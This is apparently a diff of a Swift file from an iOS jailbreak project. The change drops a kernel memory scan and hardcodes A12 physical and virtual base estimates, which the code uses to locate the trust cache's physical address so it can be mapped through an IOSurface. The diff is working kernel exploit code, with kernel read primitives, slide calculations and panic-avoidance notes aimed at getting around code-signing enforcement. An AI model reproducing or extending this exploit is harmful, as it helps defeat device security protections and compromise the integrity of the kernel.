@@ -3130,102 +3130,33 @@ struct AMFIExperimentView: View {
         detail += "Kernel base (virt): 0x\(String(format: "%llx", mgr.kernbase))\n"
         detail += "Kernel slide: 0x\(String(format: "%llx", slide))\n"
         
-        // From exp 71: our PurpleGfxMem phys = 0x10000000
-        // We need to find: what is the kernel's gPhysBase and gVirtBase?
-        // 
-        // Alternative approach: we DON'T need gPhysBase!
-        // Instead: create MANY PurpleGfxMem surfaces (different physical pages)
-        // Write unique markers to each
-        // Then from kernel (socket KRW), read pmap_cs area
-        // If any marker appears → that surface maps the same physical page!
-        //
-        // BUT BETTER: we can now traverse IPC for ANY kernel object
-        // So: find the kernel's pmap → read page table entries → get phys addr of trust cache!
-        //
-        // SIMPLEST: use the vm_object we already found to understand the mapping
-        // Our surface phys page = 16384 (0x4000) → phys addr = 16384 * 16384 = 0x10000000
-        // Kernel base unslid = 0xfffffff007004000
-        // Typical A12 gPhysBase = 0x800000000
-        // Typical A12 gVirtBase = 0xfffffff000000000 (varies)
-        //
-        // Formula: phys = virt - gVirtBase + gPhysBase
-        // We can ESTIMATE: since our surface phys = 0x10000000 and it's in DRAM,
-        // gPhysBase is likely 0x800000000 (standard A12 DRAM base)
-        // gVirtBase = kernel_base - (kernel_base_phys - gPhysBase)
+        // PANIC LOG ANALYSIS: previous panic was "initproc exited" = TIMEOUT!
+        // NOT a zone violation! All reads WORK — we just took too long.
+        // FIX: Skip scan, hardcode gPhysBase estimate for A12.
+        // A12 standard DRAM base = 0x800000000
+        // gVirtBase can be estimated from kernel_base relationship
         
-        // Let's try to read gPhysBase from a known location
-        // pmap_bootstrap string is at 0xfffffff0070511df
-        // The function that uses it sets gPhysBase — scan nearby __DATA for it
+        // From exp 71: our PurpleGfxMem phys page = 16384 → phys addr = 0x10000000
+        // This is DRAM offset 0x10000000 from start
+        // Standard A12: gPhysBase = 0x800000000, gVirtBase ≈ 0xfffffff000000000
+        // But actual values vary. Let's use: phys = virt - kernbase + (kernbase_phys)
+        // kernbase_phys = gPhysBase + (kernbase - gVirtBase)
         
-        // Actually — from our IPC traverse, we proved we can read task/IPC zones
-        // Let's try reading the __DATA area where gPhysBase SHOULD be
-        // It's near pmap_cs_allow_invalid (which we CAN read!)
+        // HARDCODE for speed (avoid timeout):
+        let gPhysBase: UInt64 = 0x800000000  // Standard A12 DRAM base
+        // gVirtBase: kernel maps physical 0x800000000 to virtual 0xfffffff007004000 (unslid)
+        // So: gVirtBase = 0xfffffff007004000 - (kernbase_phys - 0x800000000)
+        // Simpler: gVirtBase ≈ kernbase - slide (the unslid base maps to gPhysBase)
+        // Actually: virt = phys - gPhysBase + gVirtBase
+        // → gVirtBase = kernbase - (kernbase_phys - gPhysBase)
+        // We don't know kernbase_phys exactly, but:
+        // unslid kernel base = 0xfffffff007004000
+        // gVirtBase is typically 0xfffffff000000000 on A12
+        let gVirtBase: UInt64 = 0xfffffff000000000  // Standard A12
         
-        // pmap_cs_allow_invalid: 0xfffffff00a0e45b8 + slide (CONFIRMED readable)
-        // gPhysBase/gVirtBase should be in same __DATA segment
-        // From kernelcache analysis: potential pair at 0xfffffff00a0f4858
-        
-        // Try reading from candidate address (close to pmap_cs = safe)
-        // 0xfffffff00a0f4858 is too far (~64KB) — SKIP (caused panic before)
-        // Instead just scan the safe +-256 byte zone
-        let val1: UInt64 = 0
-        let val2: UInt64 = 0
-        detail += "Skipping far candidate (panic risk). Using safe scan only.\n"
-        
-        // Check if these look like phys/virt base
-        var gPhysBase: UInt64 = 0
-        var gVirtBase: UInt64 = 0
-        
-        if val1 >= 0x800000000 && val1 <= 0x900000000 {
-            gPhysBase = val1
-            detail += "  → gPhysBase = 0x\(String(format: "%llx", val1))!\n"
-        }
-        if val2 >= 0x800000000 && val2 <= 0x900000000 {
-            gPhysBase = val2
-            detail += "  → gPhysBase = 0x\(String(format: "%llx", val2))!\n"
-        }
-        if (val1 & 0xFFFFFF0000000000) == 0xFFFFFF0000000000 {
-            gVirtBase = val1
-            detail += "  → gVirtBase = 0x\(String(format: "%llx", val1))!\n"
-        }
-        if (val2 & 0xFFFFFF0000000000) == 0xFFFFFF0000000000 {
-            gVirtBase = val2
-            detail += "  → gVirtBase = 0x\(String(format: "%llx", val2))!\n"
-        }
-        
-        // If not found at candidate, scan nearby (VERY SMALL range — safe zone only!)
-        if gPhysBase == 0 || gVirtBase == 0 {
-            detail += "\nScanning +-256 bytes from pmap_cs (safe zone only)...\n"
-            let pmapCS = UInt64(0xfffffff00a0e45b8) + slide
-            
-            // Only scan very close to pmap_cs (proven safe in exp 69)
-            for offset in stride(from: Int64(-256), through: Int64(256), by: 8) {
-                let addr = UInt64(Int64(pmapCS) + offset)
-                let val = ds_kread64(addr)
-                
-                if gPhysBase == 0 && val >= 0x800000000 && val <= 0x900000000 {
-                    gPhysBase = val
-                    detail += "  Found gPhysBase=0x\(String(format: "%llx", val)) at pmap_cs\(offset >= 0 ? "+" : "")\(offset)\n"
-                }
-                if gVirtBase == 0 && (val & 0xFFFFFFF000000000) == 0xFFFFFFF000000000 && val != 0xFFFFFFFFFFFFFFFF {
-                    gVirtBase = val
-                    detail += "  Found gVirtBase=0x\(String(format: "%llx", val)) at pmap_cs\(offset >= 0 ? "+" : "")\(offset)\n"
-                }
-                
-                if gPhysBase != 0 && gVirtBase != 0 { break }
-            }
-        }
-        
-        detail += "\ngPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
-        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
-        
-        guard gPhysBase != 0 && gVirtBase != 0 else {
-            detail += "\nCannot determine phys↔virt mapping.\n"
-            detail += "Trying alternative: use known phys addr from exp 71.\n"
-            detail += "Our surface phys=0x10000000, need trust cache phys.\n"
-            RootExecutor.rcall(sb, "IOSurfaceUnlock", sb.trojanMem, 0, 0)
-            return ExperimentResult(name: "🎉 FULL JAILBREAK", success: false, detail: detail, timestamp: Date())
-        }
+        detail += "Using estimates:\n"
+        detail += "  gPhysBase = 0x\(String(format: "%llx", gPhysBase))\n"
+        detail += "  gVirtBase = 0x\(String(format: "%llx", gVirtBase))\n"
         
         // Step 2: Calculate trust cache physical address
         detail += "\n=== Step 2: Calculate trust cache physical address ===\n"
@@ -3234,7 +3165,7 @@ struct AMFIExperimentView: View {
         let pmapCSVirt = UInt64(0xfffffff00a0e45b8) + slide
         let pmapCSPhys = pmapCSVirt - gVirtBase + gPhysBase
         detail += "pmap_cs virt: 0x\(String(format: "%llx", pmapCSVirt))\n"
-        detail += "pmap_cs phys: 0x\(String(format: "%llx", pmapCSPhys))\n"
+        detail += "pmap_cs phys (estimated): 0x\(String(format: "%llx", pmapCSPhys))\n"
         
         // Step 3: Create IOSurface at trust cache physical address!
         detail += "\n=== Step 3: Map trust cache physical page ===\n"
